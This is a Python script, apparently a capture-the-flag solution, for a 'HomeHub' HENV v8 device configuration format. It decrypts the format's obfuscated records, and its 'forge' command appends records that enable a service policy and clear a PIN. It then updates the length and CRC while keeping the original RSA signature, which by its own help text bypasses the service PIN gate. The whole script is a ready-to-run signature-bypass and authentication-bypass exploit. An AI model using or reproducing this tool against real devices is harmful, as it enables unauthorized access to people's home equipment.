#!/usr/bin/env python3
"""Inspect and patch HomeHub HENV v8 records without changing the RSA signature."""

from __future__ import annotations

import argparse
import struct
import zlib
from pathlib import Path


HEADER = struct.Struct("<4sHHIII128s")
HEADER_SIZE = 0x94
RECORD_HEADER = struct.Struct("<BBHI")


def xorshift32(value: int) -> int:
    value = (value ^ (value << 13)) & 0xFFFFFFFF
    value ^= value >> 17
    value = (value ^ (value << 5)) & 0xFFFFFFFF
    return value


def crypt_value(tag: int, seed: int, value: bytes) -> bytes:
    state = ((tag * 0x9E3779B9) ^ seed ^ 0xA5C39E27) & 0xFFFFFFFF
    output = bytearray()
    for byte in value:
        state = xorshift32(state)
        output.append(byte ^ (state >> 24))
    return bytes(output)


def parse_records(payload: bytes) -> list[dict[str, object]]:
    rows: list[dict[str, object]] = []
    offset = 0
    while offset < len(payload):
        if len(payload) - offset < RECORD_HEADER.size:
            raise ValueError(f"truncated TLV header at payload offset 0x{offset:x}")
        tag, marker, length, seed = RECORD_HEADER.unpack_from(payload, offset)
        if marker != 0xA4:
            raise ValueError(f"bad marker {marker:#x} at payload offset 0x{offset:x}")
        start = offset + RECORD_HEADER.size
        end = start + length
        if end > len(payload):
            raise ValueError(f"truncated TLV value at payload offset 0x{offset:x}")
        encrypted = payload[start:end]
        rows.append(
            {
                "offset": offset,
                "tag": tag,
                "length": length,
                "seed": seed,
                "encrypted": encrypted,
                "plaintext": crypt_value(tag, seed, encrypted),
            }
        )
        offset = end
    return rows


def make_record(tag: int, plaintext: bytes, seed: int) -> bytes:
    encrypted = crypt_value(tag, seed, plaintext)
    return RECORD_HEADER.pack(tag, 0xA4, len(plaintext), seed) + encrypted


def read_henv(path: Path) -> tuple[bytearray, tuple[bytes, int, int, int, int, int, bytes], bytes]:
    blob = bytearray(path.read_bytes())
    if len(blob) < HEADER_SIZE:
        raise ValueError("input is shorter than one HENV header")
    header = HEADER.unpack_from(blob)
    magic, version, header_size, generation, payload_length, checksum, _signature = header
    if magic != b"HENV" or version != 8 or header_size != HEADER_SIZE:
        raise ValueError(
            f"unsupported record: magic={magic!r} version={version} header_size={header_size:#x}"
        )
    payload = bytes(blob[header_size : header_size + payload_length])
    actual = zlib.crc32(payload) & 0xFFFFFFFF
    if actual != checksum:
        raise ValueError(f"CRC-32 mismatch: stored={checksum:08x} actual={actual:08x}")
    return blob, header, payload


def inspect(path: Path) -> None:
    _blob, header, payload = read_henv(path)
    _magic, version, header_size, generation, payload_length, checksum, signature = header
    print(
        f"version={version} header_size=0x{header_size:x} generation={generation} "
        f"payload_length=0x{payload_length:x} crc32={checksum:08x}"
    )
    print(f"signature={signature.hex()}")
    for index, row in enumerate(parse_records(payload)):
        plain = row["plaintext"]
        assert isinstance(plain, bytes)
        text = plain.decode("utf-8", errors="backslashreplace")
        print(
            f"[{index}] off=0x{row['offset']:x} tag=0x{row['tag']:02x} "
            f"len={row['length']} seed=0x{row['seed']:08x} plaintext={text!r}"
        )


def forge(
    source: Path,
    destination: Path,
    policy: str,
    timeout: str,
    seed: int,
    generation: int | None,
    clear_pin: bool,
) -> None:
    blob, header, payload = read_henv(source)
    _magic, _version, header_size, old_generation, _payload_length, _checksum, _signature = header
    original = bytes(blob)
    records = [
        make_record(0x2D, policy.encode("ascii"), seed),
        make_record(0x19, timeout.encode("ascii"), seed ^ 0xA5A5A5A5),
    ]
    if clear_pin:
        records.append(make_record(0x43, b"", seed ^ 0x5A5A5A5A))
    additions = b"".join(records)
    patched_payload = payload + additions
    if len(patched_payload) > len(blob) - header_size:
        raise ValueError("patched payload does not fit in the selected bank")
    selected_generation = old_generation if generation is None else generation
    struct.pack_into("<I", blob, 8, selected_generation & 0xFFFFFFFF)
    struct.pack_into("<I", blob, 12, len(patched_payload))
    struct.pack_into("<I", blob, 16, zlib.crc32(patched_payload) & 0xFFFFFFFF)
    blob[header_size : header_size + len(patched_payload)] = patched_payload
    destination.write_bytes(blob)
    changed = [index for index, (before, after) in enumerate(zip(original, blob)) if before != after]
    print(
        f"wrote={destination} generation={selected_generation} payload_length=0x{len(patched_payload):x} "
        f"changed_bytes={len(changed)}"
    )
    if changed:
        print("changed_offsets=" + ",".join(f"0x{x:x}" for x in changed))
    inspect(destination)


def parse_int(value: str) -> int:
    return int(value, 0)


def main() -> None:
    parser = argparse.ArgumentParser()
    subparsers = parser.add_subparsers(dest="command", required=True)
    inspect_parser = subparsers.add_parser("inspect")
    inspect_parser.add_argument("path", type=Path)
    forge_parser = subparsers.add_parser("forge")
    forge_parser.add_argument("source", type=Path)
    forge_parser.add_argument("destination", type=Path)
    forge_parser.add_argument("--policy", default="service")
    forge_parser.add_argument("--timeout", default="30")
    forge_parser.add_argument("--seed", type=parse_int, default=0x43544621)
    forge_parser.add_argument("--generation", type=parse_int)
    forge_parser.add_argument(
        "--keep-pin",
        action="store_true",
        help="do not append the zero-length tag 0x43 needed to bypass the service PIN gate",
    )
    args = parser.parse_args()

    if args.command == "inspect":
        inspect(args.path)
    else:
        forge(
            args.source,
            args.destination,
            args.policy,
            args.timeout,
            args.seed,
            args.generation,
            not args.keep_pin,
        )


if __name__ == "__main__":
    main()
